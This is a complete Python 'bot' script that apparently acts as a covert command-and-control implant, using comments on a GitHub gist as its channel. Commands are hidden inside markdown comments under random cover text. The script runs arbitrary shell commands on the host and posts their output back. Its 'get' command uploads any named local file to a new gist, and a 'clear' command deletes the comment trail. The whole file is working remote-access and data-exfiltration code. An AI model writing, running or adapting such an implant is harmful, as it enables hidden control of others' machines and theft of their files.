#! /bin/python3
import argparse
import subprocess
import requests
from dotenv import dotenv_values
import time

from utils import create_markdown_comment,  create_markdown_timestamp, get_random_message, parse_markdown_comment

parser = argparse.ArgumentParser(
    prog='bot.py',
    description='Bot script listening to commands on given gist channel'
)

try:
    github_token = dotenv_values(".env")['GITHUB_TOKEN']
except KeyError:
    github_token = None

parser.add_argument('gistId', help="Github gist id")
parser.add_argument('-v', '--verbose', help="Show logs",
                    action='store_true')
parser.add_argument('-p', '--poll-interval', help="Set polling frequency",
                    type=int, default=5)
parser.add_argument(
    '-t', '--token', help='Github personal access token, required if not specified in .env file', required=github_token is None)


args = parser.parse_args()

if (github_token is None or args.token is not None):
    github_token = args.token

gist_id = args.gistId
gists_url = f'https://api.github.com/gists'
gist_url = f'{gists_url}/{gist_id}'
comments_url = f'{gist_url}/comments'

headers = {"authorization": f'bearer {github_token}'}
gist_response = requests.get(gist_url, headers=headers)
gist = gist_response.json()

state = {"last_update": gist['updated_at'],
         "pong_comment": None, "command_comment": None, "pong_text": None, "command_text": None}

try:
    print(f"Channel url: {gist['url']}")
except KeyError:
    print(f'Failed tof fetch gist: {gist_response}')
    exit()


def log(message):
    if not args.verbose:
        return
    print(message)


def get_latest_comments():
    response = requests.get(comments_url, headers=headers)
    comments = response.json()
    latest = list(filter(
        lambda comment: comment['updated_at'] > state['last_update'], comments))
    latest.sort(key=lambda comment: comment['updated_at'])
    return latest


def get_commands(comments):
    commands = map(lambda comment: parse_markdown_comment(
        comment['body']), comments)
    return filter(lambda command: command != '', commands)


def post_command(command: str):
    def get_message():
        state['command_text'] = state['command_text'] if state['command_text'] is not None else get_random_message()
        return f"{state['command_text']}\n\n{create_markdown_timestamp()}\n\n{create_markdown_comment(command)}"

    command_comment = state['command_comment']
    log(f'Sending response "{command}"')
    if command_comment is None:
        response = requests.post(
            comments_url, json={"body": get_message()}, headers=headers)
        state['command_comment'] = response.json()
        log(response)
        return response

    response = requests.get(
        f'{comments_url}/{command_comment["id"]}', headers=headers)

    if (response.status_code == 404):
        state['command_comment'] = None
        return post_command(command)

    response = requests.patch(
        f"{comments_url}/{command_comment['id']}", json={"body": get_message()}, headers=headers)

    log(response)
    return response


def pong():

    def get_message():
        state['pong_text'] = state['pong_text'] if state['pong_text'] is not None else get_random_message()
        return f"{state['pong_text']}\n\n{create_markdown_timestamp()}\n\n{create_markdown_comment('pong')}"

    pong_comment = state['pong_comment']
    log(f'Sending "pong"')

    if pong_comment is None:
        response = requests.post(
            comments_url, json={"body": get_message()}, headers=headers)
        state['pong_comment'] = response.json()
        return response

    response = requests.get(
        f"{comments_url}/{pong_comment['id']}", headers=headers)

    if response.status_code == 404:
        state['pong_comment'] = None
        return pong()

    response = requests.patch(
        f'{comments_url}/{pong_comment["id"]}', json={"body": get_message()}, headers=headers)
    state['last_update'] = response.json()['updated_at']
    return response


def list_to_string(input: list[str], separator=', '):
    return separator.join(map(str, input))


def delete_comments():
    comments = requests.get(comments_url, headers=headers).json()
    for comment in comments:
        comment_id = comment['id']
        log(f"deleting {comment_id}")
        response = requests.delete(
            f'{comments_url}/{comment_id}', headers=headers)
        log(response)


def post_file(filename):
    try:
        file_contents = open(filename, "r").read()
        gist_response = requests.post(gists_url, json={"files": {filename: {
                                      "content": file_contents}}, 'description': ''}, headers=headers)
        file_url = gist_response.json()["files"][filename]["raw_url"]
        return post_command(f'{filename}:\n{file_url}')
    except UnicodeDecodeError:
        log('Could not read file')
    except FileNotFoundError:
        log(f'{filename} does not exist')


def handle_command(command: str):
    log(f'Received command "{command}"')
    keys = command.split(' ')
    command_name, args = keys[0], keys[1:]
    match command_name:
        case 'w':
            result = subprocess.check_output(['w'])

            usernames = list(map(lambda line: line.decode(
                'utf-8').split(' ')[0], result.splitlines()))[2:]

            post_command(list_to_string(usernames))
        case 'ls':
            result = subprocess.check_output(['ls'] + args)
            filenames = list(map(lambda line: line.decode(
                'utf-8').split(' ')[0], result.splitlines()))
            post_command(list_to_string(filenames))
        case 'id':
            result = subprocess.check_output(['id'])
            post_command(result.decode('utf-8'))
        case 'ping':
            pong()
        case 'clear':
            delete_comments()
        case 'get':
            try:
                post_file(args[0])
            except IndexError:
                log("Received no filename")
        case _:
            log('Unknown command: '+command)
            try:
                result = subprocess.check_output([command_name]+args)
                post_command((result.decode('utf-8')))
            except FileNotFoundError:
                log(f"No such file or directory: '{command}'")
            except PermissionError:
                log(f"Permission denied: '{command}'")
            except OSError:
                log('OSError')


while True:
    time.sleep(args.poll_interval)
    log('fetching comments')
    comments = get_latest_comments()
    if len(comments) == 0:
        log('No new commands')
    for comment in comments:
        command = parse_markdown_comment(comment['body'])
        if command == 'ping' or command == 'pong':
            break
        if comment['updated_at'] > state['last_update']:
            state['last_update'] = comment['updated_at']
    for command in get_commands(comments):
        handle_command(command)
